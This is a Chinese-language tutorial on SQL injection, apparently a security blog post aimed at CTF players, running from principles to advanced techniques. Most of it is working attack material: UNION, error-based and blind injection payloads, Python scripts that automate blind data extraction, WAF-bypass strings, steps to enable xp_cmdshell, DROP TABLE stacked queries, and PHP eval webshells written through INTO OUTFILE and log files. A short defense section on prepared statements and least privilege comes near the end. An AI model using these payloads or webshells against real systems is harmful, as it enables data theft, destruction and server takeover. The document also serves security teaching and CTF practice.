---

title: SQL 注入漏洞详解——从原理到高级技巧
tags: \[Web 安全, SQL 注入, 数据库安全, CTF, 漏洞利用]
date: 2024-07-02

---

# SQL 注入漏洞详解——从原理到高级技巧

SQL 注入（SQL Injection）是 Web 安全领域最经典、危害最大的漏洞之一，至今仍稳居 OWASP Top 10 前列。攻击者通过构造恶意的 SQL 语句，可以绕过认证、窃取数据、篡改记录甚至控制数据库服务器。本文从漏洞原理出发，覆盖 MySQL、MSSQL、Oracle 等主流数据库的注入技巧，以及 WAF 绕过和防御方案。

## 1. SQL 注入漏洞原理

### 1.1 什么是 SQL 注入

当 Web 应用将用户输入未经处理直接拼接到 SQL 语句中执行时，攻击者可以插入恶意的 SQL 代码片段，从而改变原始 SQL 语句的语义。

```php
// 经典漏洞代码
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $sql);
```

正常请求：`?id=1`

```sql
SELECT * FROM users WHERE id = 1
```

注入攻击：`?id=1 OR 1=1`

```sql
SELECT * FROM users WHERE id = 1 OR 1=1
-- 返回全部用户数据
```

### 1.2 漏洞形成条件

| 条件                     | 说明                                                      |
| ------------------------ | --------------------------------------------------------- |
| **用户输入可控**         | 攻击者可以控制 SQL 语句的一部分（参数、搜索框、登录框等） |
| **输入拼接到 SQL**       | 应用将用户输入直接拼接到 SQL 字符串中                     |
| **未做过滤或过滤不完善** | 特殊字符（单引号、双引号、分号等）未被正确转义或过滤      |

### 1.3 SQL 注入分类

    SQL注入
    ├── 按参数类型
    │   ├── 数字型注入 (id=1)
    │   ├── 字符型注入 (name='admin')
    │   └── 搜索型注入 (keyword LIKE '%input%')
    ├── 按回显方式
    │   ├── 联合查询注入 (UNION SELECT)
    │   ├── 报错注入 (extractvalue/updatexml/floor)
    │   ├── 布尔盲注 (true/false判断)
    │   ├── 时间盲注 (sleep/benchmark)
    │   └── 带外注入 (OOB, DNS/HTTP外带)
    ├── 按注入位置
    │   ├── GET注入
    │   ├── POST注入
    │   ├── Cookie注入
    │   ├── HTTP Header注入 (User-Agent/Referer/X-Forwarded-For)
    │   └── 二次注入 (存储后再触发)
    └── 按数据库类型
        ├── MySQL注入
        ├── MSSQL注入
        ├── Oracle注入
        ├── PostgreSQL注入
        └── SQLite注入

---

## 2. MySQL 注入

### 2.1 注释符

```sql
#           单行注释（URL中需编码为%23）
--+         单行注释（-- 后需跟空格才能生效，+号在URL中表示空格）
--%20       单行注释（%20是空格）
/*!*/       内联注释，MySQL特有，/*!50001*/中的语句在版本>=5.0.1时执行
/*/**/      多行注释
;%00        空字节截断（PHP < 5.3.4, magic_quotes_gpc=off）
```

### 2.2 常用函数与信息搜集

```sql
-- 基本信息
SELECT version();           -- 数据库版本
SELECT user();              -- 当前用户
SELECT database();          -- 当前数据库名
SELECT @@version_compile_os;  -- 操作系统
SELECT @@datadir;           -- 数据文件目录
SELECT @@basedir;           -- MySQL安装目录
SELECT @@hostname;          -- 主机名
SELECT current_user();      -- 当前有效用户
SELECT system_user();       -- 系统用户
SELECT session_user();      -- 会话用户

-- 字符串操作
SELECT concat('a','b');     -- 字符串拼接
SELECT concat_ws(':',a,b);  -- 带分隔符拼接
SELECT group_concat(col);   -- 将多行结果拼接为一个字符串（配合注入用）
SELECT length('str');       -- 字符串长度
SELECT substr('abc',1,1);   -- 取子串
SELECT mid('abc',1,1);      -- 等价于substr
SELECT left('abc',1);       -- 从左取
SELECT right('abc',1);      -- 从右取
SELECT ascii('a');          -- 字符→ASCII
SELECT char(97);            -- ASCII→字符
SELECT hex('a');            -- 转hex
SELECT unhex('61');         -- hex反转义
SELECT ord('a');            -- 取首字符ASCII
SELECT load_file('/etc/passwd');  -- 读文件（需FILE权限）
SELECT into_outfile('/tmp/test.txt'); -- 写文件（需FILE权限）
```

### 2.3 information_schema 用法

information_schema 是 MySQL 的元数据库，存储了所有库、表、列的信息，是 SQL 注入核心信息来源。

```sql
-- 查看所有数据库
SELECT schema_name FROM information_schema.schemata;

-- 查看当前库的所有表
SELECT table_name FROM information_schema.tables
WHERE table_schema = database();

-- 查看某表的所有字段
SELECT column_name FROM information_schema.columns
WHERE table_name = 'users' AND table_schema = database();

-- 一次查询某库的所有表
SELECT group_concat(table_name) FROM information_schema.tables
WHERE table_schema = 'target_db';

-- 一次查询某表的所有字段
SELECT group_concat(column_name) FROM information_schema.columns
WHERE table_name = 'users';
```

#### 无 information_schema 注入

当`information_schema`被禁用时（如 PHPStudy 默认配置）：

```sql
-- MySQL 5.6+ 使用 innodb_index_stats / innodb_table_stats
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name = database();
SELECT table_name FROM mysql.innodb_index_stats WHERE database_name = database();

-- sys库 (MySQL 5.7+)
SELECT table_name FROM sys.schema_table_statistics;
SELECT table_name FROM sys.x$schema_flattened_keys;

-- 使用无列名注入
-- 给查询结果临时列名
SELECT 1,2,3 UNION SELECT * FROM users;
-- 用子查询+别名绕过对列名的依赖
SELECT (SELECT group_concat(`2`) FROM (SELECT 1,2,3 UNION SELECT * FROM users)a);
```

---

## 3. 联合查询注入 (UNION SELECT)

### 3.1 判断列数

```sql
-- 方法一：ORDER BY递增
?id=1 ORDER BY 1--  正常
?id=1 ORDER BY 2--  正常
?id=1 ORDER BY 3--  正常
?id=1 ORDER BY 4--  报错 → 共3列

-- 方法二：UNION SELECT NULL
?id=1 UNION SELECT NULL--       报错
?id=1 UNION SELECT NULL,NULL--  报错
?id=1 UNION SELECT NULL,NULL,NULL--  正常 → 共3列
```

### 3.2 判断回显位

```sql
?id=-1 UNION SELECT 1,2,3
-- 页面显示2和3，则2和3是回显位置
-- 将2或3替换为注入payload
?id=-1 UNION SELECT 1,version(),database()
```

### 3.3 联合查询完整流程

```sql
-- 1. 判断列数
?id=1 ORDER BY 3

-- 2. 找显示位
?id=-1 UNION SELECT 1,2,3

-- 3. 查数据库
?id=-1 UNION SELECT 1,database(),3

-- 4. 查所有表
?id=-1 UNION SELECT 1,group_concat(table_name),3
FROM information_schema.tables WHERE table_schema=database()

-- 5. 查字段
?id=-1 UNION SELECT 1,group_concat(column_name),3
FROM information_schema.columns WHERE table_name='users'

-- 6. 爆数据
?id=-1 UNION SELECT 1,group_concat(username,0x3a,password),3
FROM users
```

---

## 4. 报错注入

当页面不直接显示查询结果但显示 SQL 错误信息时使用。

### 4.1 extractvalue 报错（最多 32 字符）

```sql
-- extractvalue有两参数，第二个参数为XPATH，写入非法格式使其报错
?id=1' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) --+

-- 配合substr绕过长度限制
?id=1' AND extractvalue(1,concat(0x7e,substr((SELECT group_concat(table_name)
FROM information_schema.tables WHERE table_schema=database()),1,32),0x7e)) --+
```

### 4.2 updatexml 报错（最多 32 字符）

```sql
?id=1' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) --+

-- 逐段读取长数据
?id=1' AND updatexml(1,concat(0x7e,substr((SELECT group_concat(password)
FROM users),1,32),0x7e),1) --+
```

### 4.3 floor 报错（无长度限制）

```sql
-- 经典floor报错，利用RAND()和GROUP BY的冲突
?id=1' AND (SELECT 1 FROM (SELECT count(*),concat(database(),floor(rand(0)*2))x
FROM information_schema.tables GROUP BY x)a) --+

-- 完整爆表
?id=1' AND (SELECT 1 FROM (SELECT count(*),concat(
  (SELECT table_name FROM information_schema.tables
   WHERE table_schema=database() LIMIT 1,1),
floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) --+
```

### 4.4 其他报错方式

```sql
-- BIGINT溢出报错（MySQL <= 5.5.48）
?id=1' AND (SELECT * FROM (SELECT ~0+!(SELECT * FROM(SELECT user())x))a) --+

-- EXP溢出报错（MySQL <= 5.5.48, 目标值>709溢出）
?id=1' AND exp(~(SELECT * FROM(select user())a)) --+

-- geometrycollection报错
?id=1' AND geometrycollection((select * from(select user())a)) --+

-- polygon报错
?id=1' AND polygon((select * from(select user())a)) --+
```

---

## 5. 布尔盲注

页面没有错误回显，也没有数据显示，但根据 SQL 执行结果返回不同状态（如正常页面 vs 无内容）。

### 5.1 核心思路

逐个字符爆破数据库名、表名、列名和数据：

```sql
-- 判断数据库名的第一个字符
?id=1' AND ascii(substr((SELECT database()),1,1))>100 --+
-- 如果正常则ASCII > 100，否则 <= 100

-- 二分法加速
?id=1' AND ascii(substr((SELECT database()),1,1))>109 --+
-- 结合二分查找，单字符约8次请求
```

### 5.2 Python 自动化

```python
import requests

url = "http://target.com/index.php?id=1"
result = ""

# 字符集
chars = 'abcdefghijklmnopqrstuvwxyz0123456789@_.'

for i in range(1, 30):  # 假设数据最长为30位
    found = False
    for c in chars:
        # payload: 判断第i位是否等于字符c
        payload = f"' AND substr((SELECT database()),{i},1)='{c}' --+"
        r = requests.get(url + payload)
        if "正常页面特征" in r.text:  # 替换为真实页面特征
            result += c
            print(f"第{i}位: {c} -> {result}")
            found = True
            break
    if not found:
        break

print(f"结果: {result}")
```

### 5.3 二进制二分法脚本（更快）

```python
import requests

url = "http://target.com/index.php?id=1"
result = ""

for i in range(1, 33):
    low, high = 32, 127  # 可打印ASCII范围
    while low < high:
        mid = (low + high) // 2
        payload = f"' AND ascii(substr((SELECT database()),{i},1))>{mid} --+"
        r = requests.get(url + payload)
        if "正常页面特征" in r.text:
            low = mid + 1
        else:
            high = mid
    if low == 32:
        break
    result += chr(low)
    print(f"[+] {result}")
```

---

## 6. 时间盲注

页面无论 SQL 执行结果如何都显示相同内容时，通过延时函数判断 SQL 执行结果。

### 6.1 MySQL 延时函数

```sql
-- sleep(N) 延迟N秒
?id=1' AND sleep(5) --+

-- 条件延迟（如果符合条件则延迟，不符立即返回）
?id=1' AND if(ascii(substr((SELECT database()),1,1))>100,sleep(3),0) --+

-- benchmark替代（sleep被过滤时）
?id=1' AND if(ascii(substr((SELECT database()),1,1))>100,benchmark(5000000,md5('a')),0) --+

-- 笛卡尔积延迟（sleep和benchmark都被过滤）
?id=1' AND if(condition,(SELECT count(*) FROM information_schema.columns A,
information_schema.columns B, information_schema.columns C),0) --+
```

### 6.2 时间盲注脚本

```python
import requests
import time

url = "http://target.com/index.php?id=1"
result = ""

for i in range(1, 33):
    for c in range(32, 127):
        payload = f"' AND if(ascii(substr((SELECT database()),{i},1))={c},sleep(2),0) --+"
        start = time.time()
        try:
            r = requests.get(url + payload, timeout=5)
        except:
            pass
        elapsed = time.time() - start
        if elapsed > 1.5:
            result += chr(c)
            print(f"[+] {result}")
            break
```

---

## 7. 二次注入

恶意数据**先存储**到数据库中（注册、留言等），在后续查询/更新时被拼接到 SQL 语句中触发。

### 7.1 经典场景

```sql
-- 场景一：注册时用户名写入SQL注入payload
-- 注册用户: admin' OR '1'='1
-- 修改密码时触发

-- 修改密码的SQL
UPDATE users SET password = 'newpass' WHERE username = 'admin' OR '1'='1'
-- 结果：所有用户密码都被修改

-- 场景二：用户等级提升
-- 注册用户: test' /* 和 admin*/ --
-- 后续查询时拼成恶意SQL
```

### 7.2 利用技巧

    1. 注册恶意用户名（如：admin'#、admin'--+）
    2. 在留言板提交SQL语句片段存储到数据库
    3. 管理员后台审核或查询时触发注入
    4. 导出功能拼接存储内容导致注入

---

## 8. 堆叠注入 (Stacked Queries)

使用分号`;`分隔多条 SQL 语句依次执行。

```sql
-- 正常：查询
?id=1';SELECT * FROM users--+

-- 攻击：执行多条语句
?id=1';INSERT INTO users(username,password) VALUES ('hacker','123456')--+

-- 修改数据
?id=1';UPDATE users SET password='hacked' WHERE username='admin'--+

-- 删除数据
?id=1';DROP TABLE users--+
```

**限制**：PHP 中使用 mysqli_query()默认不支持多语句，但 mysqli_multi_query()和 PDO（未设置模拟预处理）支持。

---

## 9. WAF 绕过技巧

### 9.1 空格绕过

```sql
-- 被过滤的空格替代
SELECT/**/1,2,3                  -- /**/ 注释
SELECT%0a1,2,3                   -- %0a 换行
SELECT%0d1,2,3                   -- %0d 回车
SELECT%091,2,3                   -- %09 制表符
SELECT%0c1,2,3                   -- %0c 换页符
SELECT`1`,2,3                    -- 反引号（不推荐）
SELECT(1),(2),(3)                -- 括号包裹
-- 或者用 + 号替代空格（仅限数字上下文）
```

### 9.2 关键词绕过

```sql
-- 大小写混淆
SeLeCt * FrOm users

-- 双写绕过（部分WAF只删除一次）
SELSELECTECT * FRFROMOM users
UNIunionON SELselectECT

-- 内联注释绕过
/*!50000SELECT*/ * FROM users     -- MySQL版本号大于指定值时执行

-- 等价函数替换
-- substring → substr, mid, left, right
-- sleep → benchmark, GET_LOCK, 笛卡尔积
-- group_concat → group_concat(str SEPARATOR ',')
-- ascii → ord
-- = → like, rlike, regexp, between, in

-- 运算符替换
AND → &&
OR  → ||
=   → like → rlike → regexp → in
!=  → <>
NOT → !
```

### 9.3 逗号绕过

```sql
-- substr截取（需要逗号）→ 改用
SELECT substr(database() from 1 for 1)
SELECT mid(database() from 1 for 1)

-- limit分页 → 改用
SELECT * FROM users LIMIT 1 OFFSET 2

-- UNION SELECT 1,2,3 → 改用JOIN
SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c

-- 或者利用case when
SELECT CASE WHEN 1=1 THEN 'a' ELSE 'b' END
```

### 9.4 等号绕过

```sql
-- id=1 的等号被过滤
?id=1||id=1             -- ||
?id=1&&id=1             -- &&
?id LIKE 1              -- like
?id BETWEEN 1 AND 1     -- between
?id REGEXP '^1$'        -- regexp
?id IN(1)               -- in
?id > 0 AND id < 2      -- 范围匹配
?id=!(id!=1)            -- 双重否定
```

### 9.5 引号绕过

```sql
-- 字符型注入中引号被转义时
-- 1. 宽字节注入（GBK编码）
-- %df' →  %df和单引号前的反斜杠(%5c)组成汉字"運"，闭合引号
?id=1%df' OR 1=1 --+

-- 2. 十六进制绕过（表名、列名不能用hex字符串）
SELECT * FROM users WHERE username = 0x61646D696E  -- admin的hex

-- 3. char()函数
SELECT * FROM users WHERE username = char(97,100,109,105,110)  -- admin

-- 4. 二次编码
-- %27 → 浏览器解码为 ' → 服务器再解码为 '
```

### 9.6 科学记数法绕过

```sql
-- 部分WAF对and/or/union后面跟数字敏感
AND 1=1  →  AND 2>1
AND 1=1  →  AND 8e0=8e0
AND 1=1  →  AND .1e0=.1e0
AND NOT 0
```

---

## 10. 各数据库注入特点

### 10.1 MSSQL 注入

```sql
-- 注释符
-- /*  注意MSSQL中没有--+这种用法，--后必须跟空格 */

-- 基础查询
SELECT @@VERSION      -- 版本
SELECT DB_NAME()      -- 数据库名
SELECT HOST_NAME()    -- 主机名
SELECT SYSTEM_USER    -- 当前用户
SELECT IS_SRVROLEMEMBER('sysadmin')  -- 是否管理员

-- 查所有数据库
SELECT name FROM master..sysdatabases
SELECT DB_NAME(N)      -- 遍历N=1,2,3...

-- 查表
SELECT name FROM sysobjects WHERE xtype='U'

-- 查列
SELECT name FROM syscolumns WHERE id=OBJECT_ID('table_name')

-- 堆叠执行
EXEC('xp_cmdshell ''whoami''')  -- 需sysadmin权限

-- 开启xp_cmdshell
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;

-- 盲注技巧
-- 无sleep函数，使用 WAITFOR DELAY
IF (ASCII(SUBSTRING((SELECT DB_NAME()),1,1)))>100 WAITFOR DELAY '0:0:3'
```

### 10.2 Oracle 注入

```sql
-- 注释符
-- --  或者 /**/

-- 基础查询
SELECT banner FROM v$version    -- 版本
SELECT user FROM dual           -- 当前用户
SELECT instance_name FROM v$instance  -- SID

-- 查表空间
SELECT tablespace_name FROM user_tablespaces

-- 查所有表
SELECT table_name FROM all_tables
SELECT owner,table_name FROM all_tables

-- 查列
SELECT column_name FROM all_tab_columns WHERE table_name='TABLE_NAME'

-- Oracle特殊点：查询必须带FROM子句，使用dual表
SELECT 1,2,3 FROM dual

-- 字符串拼接
SELECT 'a' || 'b' FROM dual    -- 结果为'ab'

-- 报错注入
-- CTXSYS.DRITHSX.SN函数 (10g/11g)
-- UTL_INADDR.GET_HOST_NAME超长参数报错
-- DBMS_XDB_VERSION.CHECKIN报错
```

### 10.3 PostgreSQL 注入

```sql
-- 注释符 --  /**/

-- 基础查询
SELECT version()
SELECT current_database()
SELECT current_user

-- 查所有数据库
SELECT datname FROM pg_database

-- 查表
SELECT table_name FROM information_schema.tables
WHERE table_schema NOT IN ('information_schema','pg_catalog')

-- 查列
SELECT column_name FROM information_schema.columns
WHERE table_name='users'

-- 读文件
SELECT pg_read_file('/etc/passwd', 0, 1000)

-- 写文件
COPY (SELECT '<?php @eval($_POST[pass]);?>') TO '/var/www/html/shell.php'

-- 延时
SELECT pg_sleep(5)

-- 报错注入
-- 使用CAST转换类型报错
```

---

## 11. SQL 注入写入 WebShell

### 11.1 into outfile 写入

**条件**：

- MySQL 用户有 FILE 权限

- `secure_file_priv`为空或指向可写目录

- 知道 Web 绝对路径

- 目录可写

```sql
-- 一句话木马
SELECT '<?php @eval($_POST["pass"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- 联合查询写入
?id=-1 UNION SELECT 1,'<?php @eval($_POST["pass"]); ?>',3
INTO OUTFILE '/var/www/html/shell.php'

-- 写入时绕过escape_string：使用hex
SELECT 0x3c3f706870206576616c28245f504f53545b2270617373225d293b203f3e
INTO OUTFILE '/var/www/html/shell.php'
```

### 11.2 日志写 shell

```sql
-- 条件：MySQL用户有SUPER或SYSTEM_VARIABLES_ADMIN权限

-- 开启general_log
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';

-- 执行一个包含PHP代码的查询，写入日志
SELECT '<?php @eval($_POST[1]);?>';

-- 关闭日志
SET GLOBAL general_log = 'OFF';
```

### 11.3 慢查询日志写 shell

```sql
SET GLOBAL slow_query_log = 'ON';
SET GLOBAL slow_query_log_file = '/var/www/html/shell.php';
-- 触发慢查询（写入恶意PHP）
SELECT '<?php @eval($_POST[1]);?>' FROM mysql.user WHERE sleep(11);
```

---

## 12. SQL 注入防御

### 12.1 预编译（参数化查询）

防御 SQL 注入最有效的方式，将 SQL 结构和数据分离。

```php
// PHP PDO预编译
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();

// PHP MySQLi预编译
$stmt = $mysqli->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
$stmt->execute();
```

```java
// Java JDBC预编译
PreparedStatement pstmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

### 12.2 输入过滤与转义

```php
// mysqli_real_escape_string（不推荐作为主要防御，仅作辅助）
$id = mysqli_real_escape_string($conn, $_GET['id']);

// 类型强制转换
$id = (int)$_GET['id'];  // 数字型参数强转int

// 白名单校验
$allowed = ['id', 'username', 'email'];
if (!in_array($_GET['order'], $allowed)) {
    die('Invalid column');
}
```

### 12.3 最小权限原则

```sql
-- 为Web应用创建受限数据库用户
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
-- 只授予必要权限
GRANT SELECT, INSERT, UPDATE, DELETE ON blog.* TO 'webapp'@'localhost';
-- 不授予FILE、DROP、ALTER等权限
```

### 12.4 其他防御措施

- WAF 作为额外防护层

- 关闭数据库错误回显（`display_errors=Off`）

- 使用存储过程（需要在存储过程中也使用预编译）

- PHP 中设置`magic_quotes_gpc=Off`（不要依赖这个，PHP 5.4+已移除）

---

## 13. CTF 实战流程

    1. 识别注入点
       ├── 单引号 → 报错 → 字符型
       ├── 数字参数直接加 and 1=1/1=2 → 判断数字型
       └── 搜索框 → 用 % 和 _ 测试like型

    2. 判断数据库类型
       ├── 端口扫描 (3306=MySQL, 1433=MSSQL, 1521=Oracle)
       ├── 报错信息中的关键字
       ├── 版本函数的执行结果
       └── 特有注释符测试 ( # 是MySQL, -- 通用)

    3. 选择注入方式（按优先级）
       ├── 有回显 → UNION SELECT
       ├── 有报错 → extractvalue/updatexml/floor
       ├── 状态不同 → 布尔盲注
       └── 无差异 → 时间盲注

    4. 拖库
       └── 数据库名 → 表名 → 列名 → 数据

    5. 提权（可选）
       ├── 读文件（load_file → 源码/配置/密码）
       ├── 写文件（into outfile → WebShell）
       └── UDF提权（MySQL插件）

---

> **核心法则**：预编译是最好的防御，白名单是最安全的过滤，最小权限是最稳的配置。永远不要信任用户输入。
